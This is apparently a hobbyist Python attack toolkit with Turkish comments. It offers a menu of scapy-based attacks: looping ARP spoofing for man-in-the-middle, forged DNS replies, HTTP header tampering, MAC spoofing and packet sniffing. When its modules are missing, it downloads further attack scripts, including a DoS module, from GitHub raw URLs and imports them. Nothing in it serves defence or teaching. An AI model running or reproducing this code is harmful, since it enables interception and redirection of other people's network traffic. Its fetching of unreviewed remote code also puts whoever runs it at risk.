import os
import requests
import sys

# Kullanıcı dizini ve pyhack klasör yolu
pyhack_dir = rf"c:/users/{os.getlogin()}/pyhack"

# Erişim yolu modüller için
sys.path.append(pyhack_dir)

# pyhack modüllerini import etmeyi dene
try:
    import phantomhack
    import hack
    print("Modüller başarıyla yüklendi.")
    print(r"""
                        ,dPYb,                           ,dPYb,    
                        IP'`Yb                           IP'`Yb    
                        I8  8I                           I8  8I    
                        I8  8'                           I8  8bgg, 
 gg,gggg,    gg     gg  I8 dPgg,     ,gggg,gg    ,gggg,  I8 dP" "8 
 I8P"  "Yb   I8     8I  I8dP" "8I   dP"  "Y8I   dP"  "Yb I8d8bggP" 
 I8'    ,8i  I8,   ,8I  I8P    I8  i8'    ,8I  i8'       I8P' "Yb, 
,I8 _  ,d8' ,d8b, ,d8I ,d8     I8,,d8,   ,d8b,,d8,_    _,d8    `Yb,
PI8 YY88888PP""Y88P"88888P     `Y8P"Y8888P"`Y8P""Y8888PP88P      Y8
 I8               ,d8I'                                             I8
 I8             ,dP'8I                                              I8
 I8            ,8"  8I                                              I8
 I8            I8   8I                                              I8
 I8            `8, ,8I                                              I8
 I8             `Y8P"        
""")
    print("[0] use pyhack tool")
    print("[1] use phantomhack tool")
    print("[2] use hack tool")
    ch = input("pyhack>>>")
    if ch == "1":
        phantomhack.main()
    if ch == "2":
        hack.main()
    if ch == "0":
        Os = os.name
        if Os == "nt":
            os.system("cls")
        if Os == "posix":
            os.system("clear")
        from scapy.all import ARP, send, sniff, Ether, IP, UDP, DNS, DNSQR, DNSRR, Raw

        # 1. MITM (Man-in-the-Middle) - ARP Spoofing
        def mitm_attack(target_ip, gateway_ip):
            """
            Man-in-the-Middle (MITM) saldırısı için ARP spoofing yapar.
            """
            target_arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
            gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
            
            while True:
                send(target_arp)
                send(gateway_arp)

        # 2. DNS Spoofing
        def dns_spoof(target_ip, target_domain, fake_ip):
            """
            DNS Spoofing yaparak hedefin isteklerine yanlış IP adresi döndürür.
            """
            ip = IP(dst=target_ip)
            udp = UDP(dport=53, sport=12345)
            
            dns_query = DNSQR(qname=target_domain)
            dns_response = DNSRR(rrname=target_domain, rdata=fake_ip)
            
            dns_pkt = IP(dst=target_ip)/UDP(dport=53, sport=12345)/DNS(qr=1, aa=1, qd=dns_query, ar=dns_response)
            
            send(dns_pkt)

        # 3. HTTP Paket Manipülasyonu
        def http_packet_manipulation(packet):
            """
            HTTP paketlerini yakalar ve manipüle eder.
            """
            if packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors="ignore")
                if "HTTP" in payload:
                    print(f"HTTP Paket: {payload}")
                    # Örneğin burada belirli başlıkları değiştirebilirsiniz:
                    if "User-Agent" in payload:
                        payload = payload.replace("User-Agent", "Hacker-Agent")
                        print(f"Manipüle Edilen Paket: {payload}")

        # 4. MAC Spoofing
        def mac_spoof(target_ip, fake_mac):
            """
            MAC Spoofing yaparak hedefin ağ geçidine sahte MAC adresi gönderir.
            """
            spoofed_arp = ARP(op=2, pdst=target_ip, hwsrc=fake_mac, hwdst="ff:ff:ff:ff:ff:ff")
            send(spoofed_arp)

        # 5. ARP Spoofing
        def arp_spoof(target_ip, gateway_ip):
            """
            ARP Spoofing yaparak ağdaki cihazları aldatarak trafik yönlendirme.
            """
            target_arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
            gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
            
            while True:
                send(target_arp)
                send(gateway_arp)

        # 6. Paket Dinleyici (Sniffer)
        def packet_sniffer(packet):
            """
            Tüm paketleri dinleyerek yazdırır.
            """
            print(packet.show())

        # Kullanıcıdan seçim al
        def start_attack():
            print("PyHack - Ağ Tabanlı Saldırılar")
            print("1. MITM - ARP Spoofing")
            print("2. DNS Spoofing")
            print("3. HTTP Paket Manipülasyonu")
            print("4. MAC Spoofing")
            print("5. ARP Spoofing")
            print("6. Paket Dinleyici (Sniffer)")

            choice = input("Lütfen bir seçenek girin: ")

            if choice == "1":
                target_ip = input("Hedef IP: ")
                gateway_ip = input("Ağ geçidi IP: ")
                mitm_attack(target_ip, gateway_ip)
            elif choice == "2":
                target_ip = input("Hedef IP: ")
                target_domain = input("Hedef Domain: ")
                fake_ip = input("Sahte IP: ")
                dns_spoof(target_ip, target_domain, fake_ip)
            elif choice == "3":
                sniff(prn=http_packet_manipulation, filter="tcp port 80", store=0)
            elif choice == "4":
                target_ip = input("Hedef IP: ")
                fake_mac = input("Sahte MAC adresi: ")
                mac_spoof(target_ip, fake_mac)
            elif choice == "5":
                target_ip = input("Hedef IP: ")
                gateway_ip = input("Ağ geçidi IP: ")
                arp_spoof(target_ip, gateway_ip)
            elif choice == "6":
                sniff(prn=packet_sniffer, store=0)
            else:
                print("Geçersiz seçenek.")

        if __name__ == "__main__":
            start_attack()

except ImportError:
    print("pyhack modülleri yüklü değil.")
    yn = input("Kurmak ister misiniz? (y/n): ").strip().lower()

    if yn == "y":
        # GitHub linkleri
        hack_url = "https://raw.githubusercontent.com/githur1234/pentest/main/hack.py"
        phantom_url = "https://raw.githubusercontent.com/githur1234/phantomhack/main/phantomhack.py"
        avahi_url = "https://raw.githubusercontent.com/githur1234/pentest/main/exploit_modules/avahi_dos.py"
        netstat_url = "https://raw.githubusercontent.com/githur1234/pentest/main/exploit_modules/netstat.py"

        try:
            # Klasörü oluştur
            os.makedirs(pyhack_dir, exist_ok=True)
            print(f"Klasör oluşturuldu: {pyhack_dir}")

            # Ana dosyaları indir
            with open(os.path.join(pyhack_dir, "hack.py"), "w", encoding="utf-8") as f:
                f.write(requests.get(hack_url).text)

            with open(os.path.join(pyhack_dir, "phantomhack.py"), "w", encoding="utf-8") as f:
                f.write(requests.get(phantom_url).text)

            # exploit_modules klasörü ve dosyaları
            exploit_dir = os.path.join(pyhack_dir, "exploit_modules")
            os.makedirs(exploit_dir, exist_ok=True)

            with open(os.path.join(exploit_dir, "avahi_dos.py"), "w", encoding="utf-8") as f:
                f.write(requests.get(avahi_url).text)

            with open(os.path.join(exploit_dir, "netstat.py"), "w", encoding="utf-8") as f:
                f.write(requests.get(netstat_url).text)

            print("Tüm dosyalar başarıyla indirildi ve kaydedildi.")

        except Exception as e:
            print(f"Hata oluştu: {e}")
    else:
        print("Kurulum iptal edildi.")
